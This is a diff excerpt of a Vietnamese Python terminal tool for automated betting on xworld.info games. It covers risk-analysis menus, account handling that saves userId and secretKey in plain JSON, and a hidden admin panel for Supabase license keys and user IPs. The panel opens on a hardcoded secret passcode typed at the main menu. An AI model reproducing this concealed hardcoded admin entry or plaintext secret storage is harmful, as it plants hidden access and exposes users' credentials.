+            str(r["wins_100"]),
+            f"{r['rate_100']*100:.0f}%",
+            str(r["wins_10"]),
+            f"{r['rate_10']*100:.0f}%",
+            Text(f"{bar} {r['risk_pct']:.0f}%", style=col),
+            Text(lvl, style=f"bold {col}"),
+        )
+    console.print(t)
+    if rows:
+        safest = min(rows, key=lambda x: x["risk_pct"])
+        riskiest = max(rows, key=lambda x: x["risk_pct"])
+        tip = Text()
+        tip.append("NÊN CƯỢC  ", style=TST_COLORS["muted"])
+        tip.append(f"{safest['icon']} {safest['name']} (risk {safest['risk_pct']:.0f}%)", style=f"bold {TST_COLORS['emerald']}")
+        tip.append("    │    ", style=TST_COLORS["accent_line"])
+        tip.append("TRÁNH  ", style=TST_COLORS["muted"])
+        tip.append(f"{riskiest['icon']} {riskiest['name']} (risk {riskiest['risk_pct']:.0f}%)", style=f"bold {TST_COLORS['ruby']}")
+        console.print(Panel(Align.center(tip), border_style=TST_COLORS["accent_line"], box=box.SIMPLE, padding=(0, 1)))
+
+
+def risk_analysis_vth() -> None:
+    console.clear()
+    brand = Text()
+    brand.append(" ♛ ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['emerald']}")
+    brand.append("  RỦI RO PHÒNG VTH  ", style=f"bold {TST_COLORS['platinum']}")
+    brand.append("·  RISK MATRIX", style=TST_COLORS["muted"])
+    console.print(Panel(Align.center(brand), border_style=TST_COLORS["emerald"], box=box.HEAVY_HEAD, padding=(0, 1)))
+    console.print(Align.center(Text("Cao = phòng dễ bị sát thủ chọn  ·  Thấp = an toàn hơn", style=TST_COLORS["muted"])))
+    console.print()
+    with console.status(f"[bold {TST_COLORS['gold']}]Đang tính rủi ro phòng...[/]", spinner="dots"):
+        rows = compute_vth_room_risk()
+        time.sleep(0.35)
+    display_vth_risk_table(rows)
+    console.print()
+    console.print(Text("Công thức: kill_rate×45% + đông người×20% + tiền cược×15% + gần đây bị kill×20%", style=TST_COLORS["muted"]))
+    input("\n[dim]Nhấn Enter để quay lại...[/dim]")
+
+
+def risk_analysis_cdtd() -> None:
+    console.clear()
+    brand = Text()
+    brand.append(" ▶▶ ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['neon_blue']}")
+    brand.append("  RỦI RO NHÂN VẬT CDTD  ", style=f"bold {TST_COLORS['platinum']}")
+    brand.append("·  RISK MATRIX", style=TST_COLORS["muted"])
+    console.print(Panel(Align.center(brand), border_style=TST_COLORS["neon_blue"], box=box.HEAVY_HEAD, padding=(0, 1)))
+    console.print(Align.center(Text("Cao = cược NV này dễ thua  ·  Thấp = form tốt, nên cân nhắc", style=TST_COLORS["muted"])))
+    console.print()
+    try:
+        data = load_data_cdtd()
+        setup_cdtd_headers(data)
+    except Exception as e:
+        console.print(f"[red]Không tải được tài khoản CDTD: {e}[/red]")
+        input("\n[dim]Enter...[/dim]")
+        return
+    with console.status(f"[bold {TST_COLORS['gold']}]Đang tải top 10 / top 100...[/]", spinner="dots"):
+        top10 = top_10_cdtd()
+        top100 = top_100_cdtd()
+        rows = compute_cdtd_nv_risk(top10, top100)
+        time.sleep(0.3)
+    display_cdtd_risk_table(rows)
+    console.print()
+    console.print(Text("Công thức: risk ≈ 100% − (win100×55% + form10×45%)  ·  +8% nếu vừa thắng", style=TST_COLORS["muted"]))
+    input("\n[dim]Nhấn Enter để quay lại...[/dim]")
+
+
+def risk_analysis_menu() -> None:
+    """Menu chính: phân tích rủi ro phòng VTH & nhân vật CDTD."""
+    while True:
+        console.clear()
+        brand = Text()
+        brand.append(" ◈ ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['neon_orange']}")
+        brand.append("  PHÂN TÍCH RỦI RO  ", style=f"bold {TST_COLORS['platinum']}")
+        brand.append("·  VTH / CDTD", style=TST_COLORS["muted"])
+        console.print(Panel(Align.center(brand), border_style=TST_COLORS["neon_orange"], box=box.HEAVY_HEAD, padding=(0, 1)))
+        console.print()
+        t = Table(show_header=False, box=box.SIMPLE, expand=True, padding=(0, 1))
+        t.add_column(width=4)
+        t.add_column()
+        t.add_column()
+        t.add_row(
+            Text(" 1 ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['emerald']}"),
+            Text(" ♛  VTH — Rủi ro phòng", style=f"bold {TST_COLORS['platinum']}"),
+            Text("8 phòng · kill / players / bet", style=TST_COLORS["muted"]),
+        )
+        t.add_row(
+            Text(" 2 ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['neon_blue']}"),
+            Text(" ▶▶ CDTD — Rủi ro nhân vật", style=f"bold {TST_COLORS['platinum']}"),
+            Text("6 NV · win rate 10/100", style=TST_COLORS["muted"]),
+        )
+        t.add_row(
+            Text(" q ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['muted']}"),
+            Text(" Quay lại menu chính", style=TST_COLORS["muted"]),
+            Text(""),
+        )
+        console.print(Panel(t, border_style=TST_COLORS["neon_orange"], box=box.HEAVY_HEAD, padding=(0, 1)))
+        choice = Prompt.ask(
+            f"[bold {TST_COLORS['gold']}] ♛  CHỌN[/bold {TST_COLORS['gold']}]",
+            choices=["1", "2", "q"],
+            default="q",
+        )
+        if choice == "1":
+            risk_analysis_vth()
+        elif choice == "2":
+            risk_analysis_cdtd()
+        else:
+            break
+
+
+
+# ================== ADMIN MENU (ẨN) ==================
+
+def supabase_list_keys(limit: int = 50) -> list:
+    """Lấy danh sách key từ Supabase."""
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/keys?select=*&order=created_at.desc&limit={limit}"
+        r = requests.get(url, headers=supabase_headers(), timeout=15)
+        if r.status_code == 200:
+            return r.json() if isinstance(r.json(), list) else []
+        # fallback không có created_at
+        url2 = f"{SUPABASE_URL}/rest/v1/keys?select=*&limit={limit}"
+        r2 = requests.get(url2, headers=supabase_headers(), timeout=15)
+        if r2.status_code == 200:
+            return r2.json() if isinstance(r2.json(), list) else []
+        return []
+    except Exception as e:
+        safe_console_print(f"[red]Lỗi list keys: {e}[/red]")
+        return []
+
+
+def supabase_deactivate_key(key_code: str) -> tuple:
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/keys?key_code=eq.{key_code}"
+        r = requests.patch(url, headers=supabase_headers(prefer="return=representation"),
+                           json={"status": "inactive"}, timeout=15)
+        if r.status_code in (200, 204):
+            return True, "Đã vô hiệu hóa key"
+        return False, f"HTTP {r.status_code}: {r.text[:200]}"
+    except Exception as e:
+        return False, str(e)
+
+
+def admin_create_key_interactive(key_type: str = "free") -> None:
+    """Admin tạo key FREE hoặc VIP trên Supabase."""
+    prefix = "VIP_" if key_type == "vip" else "FREE_"
+    default_ai = 42 if key_type == "vip" else 10
+    default_hours = 720 if key_type == "vip" else 13  # VIP mặc định 30 ngày
+
+    console.print(f"\n[bold]Tạo KEY {key_type.upper()}[/bold]")
+    custom = Prompt.ask("Key code (Enter = tự sinh)", default="")
+    if custom:
+        key_code = custom.strip().upper()
+    else:
+        key_code = prefix + secrets.token_hex(5).upper()
+
+    max_ai = IntPrompt.ask("max_ai", default=default_ai)
+    hours = IntPrompt.ask("Thời hạn (giờ)", default=default_hours)
+    note = Prompt.ask("Ghi chú", default=f"Admin tạo {key_type}")
+
+    ok, result = create_key_on_supabase(
+        key_code=key_code,
+        key_type=key_type,
+        max_ai=max_ai,
+        duration_hours=hours,
+        note=note,
+    )
+    if ok:
+        console.print(Panel(
+            Text.assemble(
+                ("✅ TẠO KEY THÀNH CÔNG\n\n", "bold green"),
+                ("KEY: ", "white"), (f"{key_code}\n", f"bold {TST_COLORS['gold']}"),
+                ("Loại: ", "white"), (f"{key_type.upper()}\n", "bold cyan"),
+                ("AI: ", "white"), (f"{max_ai}\n", "bold"),
+                ("Hạn: ", "white"), (f"{hours} giờ\n", "bold"),
+            ),
+            border_style=TST_COLORS["emerald"], box=box.ROUNDED
+        ))
+    else:
+        console.print(f"[red]❌ {result}[/red]")
+
+
+def admin_menu() -> None:
+    """Menu admin ẩn — quản lý key qua Supabase."""
+    while True:
+        console.clear()
+        console.print(Panel(
+            Align.center(Text.assemble(
+                ("🔐 ADMIN PANEL\n", f"bold {TST_COLORS['ruby']}"),
+                ("Kết nối Supabase · Quản lý key & user", "dim"),
+            )),
+            border_style=TST_COLORS["ruby"],
+            box=box.ROUNDED
+        ))
+        console.print("[1] 📋 Xem toàn bộ key (Supabase)")
+        console.print("[2] 🔑 Thêm KEY FREE (10 AI, Lotto 5 AI)")
+        console.print("[3] 👑 Thêm KEY VIP (toàn bộ AI)")
+        console.print("[4] ❌ Vô hiệu hóa key")
+        console.print("[5] 👥 Xem user local (xu/key)")
+        console.print("[6] ☁️  Xem user Supabase (user_id + IP)")
+        console.print("[7] 🔓 Gỡ BAN user (Supabase)")
+        console.print("[q] 🔙 Thoát admin")
+        console.print()
+        choice = Prompt.ask(">>", choices=["1", "2", "3", "4", "5", "6", "7", "q"], default="q")
+
+        if choice == "q":
+            break
+        elif choice == "1":
+            keys = supabase_list_keys(100)
+            if not keys:
+                console.print("[yellow]Không có key hoặc không đọc được Supabase.[/yellow]")
+            else:
+                t = Table(box=box.ROUNDED, border_style=TST_COLORS["gold"], title=f"Keys ({len(keys)})")
+                t.add_column("key_code", style=TST_COLORS["neon_blue"])
+                t.add_column("type")
+                t.add_column("status")
+                t.add_column("max_ai", justify="right")
+                t.add_column("expires")
+                t.add_column("used", justify="right")
+                t.add_column("note", style="dim")
+                for k in keys:
+                    t.add_row(
+                        str(k.get("key_code", ""))[:24],
+                        str(k.get("key_type", "")),
+                        str(k.get("status", "")),
+                        str(k.get("max_ai", "")),
+                        str(k.get("expires_at", ""))[:19],
+                        str(k.get("used_count", 0)),
+                        str(k.get("note", ""))[:20],
+                    )
+                console.print(t)
+            input("\n[dim]Enter...[/dim]")
+        elif choice == "2":
+            admin_create_key_interactive("free")
+            input("\n[dim]Enter...[/dim]")
+        elif choice == "3":
+            admin_create_key_interactive("vip")
+            input("\n[dim]Enter...[/dim]")
+        elif choice == "4":
+            kc = Prompt.ask("Nhập key_code cần khóa").strip()
+            if kc:
+                ok, msg = supabase_deactivate_key(kc)
+                console.print(f"[green]✅ {msg}[/green]" if ok else f"[red]❌ {msg}[/red]")
+            input("\n[dim]Enter...[/dim]")
+        elif choice == "5":
+            data = load_user_data_secure()
+            if not data:
+                console.print("[yellow]Chưa có user local.[/yellow]")
+            else:
+                t = Table(box=box.ROUNDED, border_style=TST_COLORS["sapphire"], title=f"Users ({len(data)})")
+                t.add_column("ID")
+                t.add_column("IP")
+                t.add_column("Xu", justify="right")
+                t.add_column("Keys", justify="right")
+                t.add_column("Tạo lúc", style="dim")
+                for uid, ud in data.items():
+                    t.add_row(
+                        str(uid)[:12],
+                        str(ud.get("ip", ""))[:18],
+                        f"{ud.get('coins', 0):.1f}",
+                        str(len(ud.get("keys", []) or [])),
+                        str(ud.get("created_at", ""))[:19],
+                    )
+                console.print(t)
+            input("\n[dim]Enter...[/dim]")
+        elif choice == "6":
+            users = supabase_list_users(100)
+            if not users:
+                console.print("[yellow]Không có user trên Supabase hoặc bảng users chưa tạo.[/yellow]")
+                console.print("[dim]Chạy SQL tạo bảng users trong Supabase SQL Editor (xem comment trong code).[/dim]")
+            else:
+                t = Table(box=box.ROUNDED, border_style=TST_COLORS["emerald"], title=f"Supabase Users ({len(users)})")
+                t.add_column("user_id", style=TST_COLORS["neon_blue"])
+                t.add_column("IP")
+                t.add_column("Xu", justify="right")
+                t.add_column("Keys", justify="right")
+                t.add_column("status")
+                t.add_column("updated", style="dim")
+                for u in users:
+                    t.add_row(
+                        str(u.get("user_id", ""))[:14],
+                        str(u.get("ip", ""))[:18],
+                        f"{float(u.get('coins', 0) or 0):.1f}",
+                        str(u.get("keys_count", 0)),
+                        str(u.get("status", "")),
+                        str(u.get("updated_at", "") or u.get("last_seen_at", ""))[:19],
+                    )
+                console.print(t)
+            input("\n[dim]Enter...[/dim]")
+        elif choice == "7":
+            uid = Prompt.ask("Nhập user_id cần gỡ ban").strip()
+            if uid:
+                ok, msg = supabase_unban_user(uid)
+                console.print(f"[green]✅ {msg}[/green]" if ok else f"[red]❌ {msg}[/red]")
+            input("\n[dim]Enter...[/dim]")
+
+
+# ================== MAIN MENU ==================
+
+def build_main_menu():
+    global _in_menu, _ws_status, _secure_mode
+    _in_menu = True
+    console.clear()
+
+    # ── HEADER BRAND ─────────────────────────────────────────────
+    print_tst_logo()
+    console.print()
+
+    # ── MODULE GRID ───────────────────────────────────────────────
+    # Left column: game modules. Right column: tools.
+    LEFT = [
+        ("1", "♛", "VUA THOÁT HIỂM", "42 AI  ·  chiến lược tự động", TST_COLORS["emerald"]),
+        ("2", "▶▶", "CHẠY ĐUA TỐC ĐỘ", "42 AI  ·  dự đoán đua",       TST_COLORS["neon_blue"]),
+        ("3", "★", "WINHASH LOTTO",   "AI dự đoán xổ số",             TST_COLORS["gold"]),
+    ]
+    RIGHT = [
+        ("4", "◉", "THÊM TÀI KHOẢN", "quản lý tài khoản",   TST_COLORS["sapphire"]),
+        ("5", "✕", "XÓA TÀI KHOẢN",  "quản lý tài khoản",   TST_COLORS["ruby"]),
+        ("6", "◈", "CẤU HÌNH",       "cấu hình workspace",  TST_COLORS["lavender"]),
+        ("7", "▲", "CHẠY CẤU HÌNH",  "chạy config đã lưu",  TST_COLORS["neon_orange"]),
+        ("8", "▦", "PHÂN TÍCH RỦI RO", "phòng VTH · NV CDTD", TST_COLORS["neon_orange"]),
+    ]
+
+    def _module_row(no, icon, name, desc, accent):
+        num_txt = Text(f" {no} ", style=f"bold {TST_COLORS['bg_deep']} on {accent}")
+        ico_txt = Text(f" {icon} ", style=f"bold {accent}")
+        name_txt = Text(name, style=f"bold {TST_COLORS['platinum']}")
+        desc_txt = Text(f"  {desc}", style=TST_COLORS["muted"])
+        line = Text()
+        line.append_text(num_txt)
+        line.append_text(ico_txt)
+        line.append_text(name_txt)
+        line.append_text(desc_txt)
+        return line
+
+    # Game modules in a highlighted panel
+    game_table = Table(show_header=False, box=box.SIMPLE, expand=True, padding=(0, 1))
+    game_table.add_column(width=3)
+    game_table.add_column(width=3)
+    game_table.add_column()
+    game_table.add_column()
+    for no, icon, name, desc, accent in LEFT:
+        game_table.add_row(
+            Text(f" {no} ", style=f"bold {TST_COLORS['bg_deep']} on {accent}"),
+            Text(f" {icon} ", style=f"bold {accent}"),
+            Text(name, style=f"bold {TST_COLORS['platinum']}"),
+            Text(desc, style=TST_COLORS["muted"]),
+        )
+    game_panel = Panel(
+        game_table,
+        title=f"[bold {TST_COLORS['emerald']}]  ▶  MODULE GAME  [/]",
+        border_style=TST_COLORS["emerald"],
+        box=box.HEAVY_HEAD,
+        padding=(0, 1),
+    )
+
+    tool_table = Table(show_header=False, box=box.SIMPLE, expand=True, padding=(0, 1))
+    tool_table.add_column(width=3)
+    tool_table.add_column(width=3)
+    tool_table.add_column()
+    tool_table.add_column()
+    for no, icon, name, desc, accent in RIGHT:
+        tool_table.add_row(
+            Text(f" {no} ", style=f"bold {TST_COLORS['bg_deep']} on {accent}"),
+            Text(f" {icon} ", style=f"bold {accent}"),
+            Text(name, style=f"bold {TST_COLORS['platinum']}"),
+            Text(desc, style=TST_COLORS["muted"]),
+        )
+    tool_panel = Panel(
+        tool_table,
+        title=f"[bold {TST_COLORS['sapphire']}]  ◈  CÔNG CỤ  [/]",
+        border_style=TST_COLORS["sapphire"],
+        box=box.HEAVY_HEAD,
+        padding=(0, 1),
+    )
+
+    grid = Table.grid(expand=True, padding=(0, 1))
+    grid.add_column(ratio=45)
+    grid.add_column(ratio=55)
+    grid.add_row(game_panel, tool_panel)
+    console.print(grid)
+
+    # ── STATUS STRIP ──────────────────────────────────────────────
+    key_color = TST_COLORS["gold"] if _key_type == "vip" else TST_COLORS["diamond"]
+    status = Text()
+    status.append("  ◉ ", style=TST_COLORS["muted"])
+    status.append(f"QUYỀN ", style=TST_COLORS["muted"])
+    status.append(f"{str(_key_type).upper()} ", style=f"bold {key_color}")
+    status.append("  │  ", style=TST_COLORS["accent_line"])
+    status.append(f"WS ", style=TST_COLORS["muted"])
+    status.append(f"{_ws_status} ", style=TST_COLORS["diamond"])
+    status.append("  │  ", style=TST_COLORS["accent_line"])
+    status.append("  │  ", style=TST_COLORS["accent_line"])
+    status.append(f"IP ", style=TST_COLORS["muted"])
+    status.append(f"{_ip_info.get('public_ip','N/A')}  ", style=TST_COLORS["sky"])
+    console.print(Panel(Align.center(status), border_style=TST_COLORS["accent_line"], box=box.SIMPLE, padding=(0,0)))
+
+    raw = _ui_prompt("CHỌN MODULE  [1-9 / q]").lower()
+    if raw == ADMIN_SECRET_CODE or raw == "9826665":
+        try: admin_menu()
+        except NameError: console.print("[red]Admin menu chưa sẵn sàng.[/red]"); time.sleep(1)
+        return build_main_menu()
+    return raw if raw in ["1","2","3","4","5","6","7","8","9","q"] else "q"
+
+
+def load_accounts() -> list:
+    acc_file = Path("accounts.json")
+    if not acc_file.exists():
+        return []
+    try:
+        return json.loads(acc_file.read_text())
+    except (json.JSONDecodeError, IOError):
+        return []
+
+def save_accounts(accounts: list):
+    acc_file = Path("accounts.json")
+    with acc_file.open("w", encoding="utf-8") as f:
+        json.dump(accounts, f, indent=2)
+
+def add_new_account(accounts: list) -> bool:
+    console.clear()
+    header = Panel(Align.center(Text.assemble((f"{ICONS['user']} ", f"bold {TST_COLORS['gold']}"), ("THÊM TÀI KHOẢN", f"bold {TST_COLORS['neon_blue']}"), (f" {ICONS['user']}", f"bold {TST_COLORS['gold']}"))), border_style=TST_COLORS["gold"], box=box.ROUNDED)
+    console.print(header)
+    console.print()
+    console.print(Panel(Text.assemble((f"{ICONS['info']} ", "bold yellow"), ("Dán link trò chơi vào bên dưới", "white"), ("\n", ""), ("Ví dụ: ", "dim"), ("https://xworld.info/?userId=12345&secretKey=abc123", "dim cyan")), border_style=TST_COLORS["sapphire"], box=box.ROUNDED))
+    console.print()
+    link = Prompt.ask(f"[bold {TST_COLORS['gold']}]>> Dán link[/bold {TST_COLORS['gold']}]")
+    if not link:
+        console.print("[yellow]Đã hủy.[/yellow]")
+        time.sleep(1)
+        return False
+    try:
+        parsed = urlparse(link)
+        params = parse_qs(parsed.query)
+        if 'userId' in params and 'secretKey' in params:
+            uid = int(params.get('userId')[0])
+            skey = params.get('secretKey', [None])[0]
+            if any(acc.get('userId') == uid for acc in accounts):
+                console.print(f"[yellow]⚠️ Tài khoản userId: {uid} đã tồn tại.[/yellow]")
+                time.sleep(2)
+                return False
+            accounts.append({"userId": uid, "secretKey": skey})
+            save_accounts(accounts)
+            console.print(Panel(Align.center(Text.assemble((f"{ICONS['check']} ", "bold green"), (f"Đã thêm tài khoản: ", "bold white"), (f"{uid}", f"bold {TST_COLORS['gold']}"))), border_style=TST_COLORS["emerald"], box=box.ROUNDED))
+            time.sleep(2)
+            return True
+        else:
+            console.print("[red]❌ Link không hợp lệ! Thiếu 'userId' hoặc 'secretKey'.[/red]")
+            time.sleep(2)
+            return False
+    except Exception as e:
+        console.print(f"[red]❌ Error: {e}[/red]")
+        time.sleep(2)
+        return False
+
+def delete_account(accounts: list) -> bool:
+    console.clear()
+    header = Panel(Align.center(Text.assemble((f"{ICONS['fire']} ", f"bold {TST_COLORS['ruby']}"), ("XÓA TÀI KHOẢN", f"bold {TST_COLORS['neon_blue']}"), (f" {ICONS['fire']}", f"bold {TST_COLORS['ruby']}"))), border_style=TST_COLORS["ruby"], box=box.ROUNDED)
+    console.print(header)
+    console.print()
+    if not accounts:
+        console.print("[yellow]Không có tài khoản để xóa.[/yellow]")
+        time.sleep(2)
+        return False
+    table = Table(box=box.ROUNDED, border_style=TST_COLORS["ruby"])
+    table.add_column("STT", style=f"bold {TST_COLORS['gold']}", width=6)
+    table.add_column("User ID", style=TST_COLORS["neon_blue"])
+    for i, acc in enumerate(accounts, 1):
+        table.add_row(str(i), str(acc.get('userId')))
+    console.print(table)
+    console.print()
+    choice_str = Prompt.ask(f"[bold {TST_COLORS['ruby']}]>> Chọn tài khoản cần xóa[/bold {TST_COLORS['ruby']}]", default="")
+    if not choice_str:
+        console.print("[yellow]Đã hủy.[/yellow]")
+        time.sleep(1)
+        return False
+    try:
+        choice_idx = int(choice_str) - 1
+        if 0 <= choice_idx < len(accounts):
+            removed_acc = accounts.pop(choice_idx)
+            save_accounts(accounts)
+            console.print(f"[green]✅ Đã xóa tài khoản: {removed_acc.get('userId')}[/green]")
+            time.sleep(2)
+            return True
+        else:
+            console.print("[red]❌ Lựa chọn không hợp lệ.[/red]")
+            time.sleep(1)
+            return False
+    except ValueError:
+        console.print("[red]❌ Nhập liệu không hợp lệ.[/red]")
+        time.sleep(1)
+        return False
+
+def select_account_premium() -> bool:
+    global USER_ID, SECRET_KEY
+    while True:
+        console.clear()
+        header = Panel(Align.center(Text.assemble((f"{ICONS['user']} ", f"bold {TST_COLORS['gold']}"), ("CHỌN TÀI KHOẢN", f"bold {TST_COLORS['neon_blue']}"), (f" {ICONS['user']}", f"bold {TST_COLORS['gold']}"))), border_style=TST_COLORS["gold"], box=box.ROUNDED)
+        console.print(header)
+        console.print()
+        accounts = load_accounts()
+        if not accounts:
+            console.print(Panel(Align.center(Text.assemble((f"{ICONS['warning']} ", "bold yellow"), ("Không có tài khoản nào!", "bold white"), ("\n", ""), ("Vui lòng dùng tùy chọn [5] để thêm tài khoản", "dim"))), border_style=TST_COLORS["ruby"], box=box.ROUNDED))
+            time.sleep(2)
+            return False
+        table = Table(title=f"[bold {TST_COLORS['gold']}]📋 DANH SÁCH TÀI KHOẢN[/bold {TST_COLORS['gold']}]", box=box.ROUNDED, border_style=TST_COLORS["sapphire"])
+        table.add_column("STT", style=f"bold {TST_COLORS['gold']}", width=6)
+        table.add_column("User ID", style=TST_COLORS["neon_blue"])
+        table.add_column("Số dư", justify="right")
+        table.add_column("Trạng thái", justify="center")
+        with console.status(f"[bold {TST_COLORS['neon_blue']}]🔍 Đang kiểm tra số dư...[/bold {TST_COLORS['neon_blue']}]", spinner="dots") as status:
+            for i, acc in enumerate(accounts, 1):
+                uid = acc.get('userId')
+                skey = acc.get('secretKey')
+                status.update(f"[{TST_COLORS['neon_blue']}]Đang kiểm tra tài khoản {uid}...[/{TST_COLORS['neon_blue']}]")
+                build, _, _ = fetch_balances_3games(uid=uid, secret=skey)
+                if build is not None:
+                    balance_str = f"[bold {TST_COLORS['emerald']}]{build:,.4f}[/bold {TST_COLORS['emerald']}]"
+                    status_str = f"[{TST_COLORS['emerald']}]✅ Trực tuyến[/{TST_COLORS['emerald']}]"
+                else:
+                    balance_str = f"[{TST_COLORS['ruby']}]❌ Error[/{TST_COLORS['ruby']}]"
+                    status_str = f"[{TST_COLORS['ruby']}]❌ Ngoại tuyến[/{TST_COLORS['ruby']}]"
+                table.add_row(str(i), str(uid), balance_str, status_str)
+        console.print(table)
+        console.print()
+        choices = [str(i) for i in range(1, len(accounts) + 1)]
+        choice_str = Prompt.ask(f"[bold {TST_COLORS['gold']}]>> Chọn số tài khoản[/bold {TST_COLORS['gold']}]", choices=choices, default="")
+        if not choice_str:
+            return False
+        try:
+            choice_idx = int(choice_str) - 1
+            if 0 <= choice_idx < len(accounts):
+                selected_account = accounts[choice_idx]
+                USER_ID = selected_account['userId']
+                SECRET_KEY = selected_account['secretKey']
+                console.print(Panel(Align.center(Text.assemble((f"{ICONS['check']} ", "bold green"), (f"Đã chọn tài khoản: ", "bold white"), (f"{USER_ID}", f"bold {TST_COLORS['gold']}"))), border_style=TST_COLORS["emerald"], box=box.ROUNDED))
+                time.sleep(1.5)
+                return True
+            else:
+                console.print("[red]❌ Lựa chọn không hợp lệ![/red]")
+                time.sleep(1)
+                return False
+        except ValueError:
+            console.print("[red]❌ Nhập liệu không hợp lệ![/red]")
+            time.sleep(1)
+            return False
+
+# ================== MAIN PROGRAM ==================
+
+def main_vth():
+    global _in_menu, _is_authenticated, _user_key, _key_type
+
+    force_clear()          # Xóa sạch màn hình ngay khi bắt đầu
+    migrate_old_data()
+
+    # Chỉ kiểm tra ban theo IP (đã bỏ rule cùng máy / fingerprint)
+    try:
+        ok_dev, msg_dev, _uid_dev = check_device_ip_integrity()
+        if not ok_dev:
+            safe_console_print(f"[bold red]{msg_dev}[/bold red]")
+            input("\n[dim]Enter để thoát...[/dim]")
+            return
+    except Exception as e:
+        safe_console_print(f"[yellow]⚠️ Không kiểm tra được IP/ban: {e}[/yellow]")
+
+    while not _is_authenticated:
+        force_clear()      # Xóa sạch trước mỗi lần hiện menu đăng nhập
+        success, key, key_type = show_auth_choice_menu()
+        if success:
+            _is_authenticated = True
+            _user_key = key
+            _key_type = key_type
+            break
+
+        console.print()
+        retry = Prompt.ask(
+            "[bold yellow]Bạn có muốn thử lại không? (y/n)[/bold yellow]",
+            choices=['y', 'n'],
+            default='y'
+        )
+        if retry.lower() == 'n':
+            console.print("[red]👋 Tạm biệt![/red]")
+            return
+
+    force_clear()          # Xóa sạch trước khi hiện logo + menu chính
+    key_col = TST_COLORS["gold"] if _key_type == "vip" else TST_COLORS["diamond"]
+    print_tst_logo()
+    console.print()
+    info_strip = Text()
+    info_strip.append(" ♛ ACCESS ", style=f"bold {TST_COLORS['muted']}")
+    info_strip.append(f"{_key_type.upper()}  ", style=f"bold {key_col}")
+    info_strip.append("│  KEY ", style=TST_COLORS["accent_line"])
+    info_strip.append(f"{_user_key}  ", style=TST_COLORS["muted"])
+    if _key_type == "free":
+        info_strip.append("│  FREE: 10 AI · Lotto 5 AI", style=TST_COLORS["muted"])
+    info_strip.append("│  @tst-tool88", style=TST_COLORS["accent_line"])
+    console.print(Panel(Align.center(info_strip), border_style=key_col, box=box.SIMPLE, padding=(0,0)))
+    console.print()
+    time.sleep(1)
+
+    while True:
+        global stop_flag
+        stop_flag = False
+        choice = build_main_menu()
+
+        if choice == '1':
+            force_clear()
+            if select_account_premium():
+                if prompt_settings():
+                    start_game_flow()
+
+        elif choice == '2':
+            main_cdtd_v3()
+
+        elif choice == '3':
+            console.print("[yellow]⚠️ Chức năng WINHASH LOTTO chưa có hàm xử lý trong file hiện tại.[/yellow]")
+            console.print("[dim]FREE key: tối đa 5 AI Lotto | VIP: full AI[/dim]")
+            time.sleep(2)
+
+        elif choice == '4':
+            accounts = load_accounts()
+            add_new_account(accounts)
+
+        elif choice == '5':
+            accounts = load_accounts()
+            delete_account(accounts)
+
+        elif choice == '6':
+            force_clear()
+            if prompt_settings():
+                save_strategy_config()
+            time.sleep(2)
+
+        elif choice == '7':
+            force_clear()
+            if select_account_premium():
+                if load_strategy_config():
+                    start_game_flow()
+                else:
+                    time.sleep(2)
+
+        elif choice == '8':
+            try:
+                risk_analysis_menu()
+            except Exception as e:
+                console.print(f"[red]❌ Lỗi phân tích rủi ro: {e}[/red]")
+                time.sleep(2)
+
+        elif choice == 'q':
+            stop_heartbeat()
+            stop_flag = True
+            console.print(Panel(
+                Group(
+                    Align.center(Text("♛  ♛  ♛", style=f"bold {TST_COLORS['gold']}")),
+                    Align.center(Text("THANK YOU FOR USING  TST-TOOL", style=f"bold {TST_COLORS['platinum']}")),
+                    Align.center(Text("◈ Support: @tst-tool88  ·  Version 3.0  ◈", style=TST_COLORS["muted"])),
+                ),
+                border_style=TST_COLORS["gold"],
+                box=box.HEAVY_HEAD,
+                padding=(1, 2),
+            ))
+            break
+
+
+if __name__ == "__main__":
+    try:
+        main_vth()
+    except KeyboardInterrupt:
+        stop_flag = True
+        stop_heartbeat()
+        console.print(Panel(
+            Align.center(Text.assemble(
+                ("♛  ", f"bold {TST_COLORS['gold']}"),
+                ("TST-TOOL  —  ĐÃ DỪNG  ", f"bold {TST_COLORS['platinum']}"),
+                ("♛", f"bold {TST_COLORS['gold']}"),
+            )),
+            border_style=TST_COLORS["accent_line"],
+            box=box.SIMPLE,
+            padding=(0, 2),
+        ))
+        sys.exit(0)
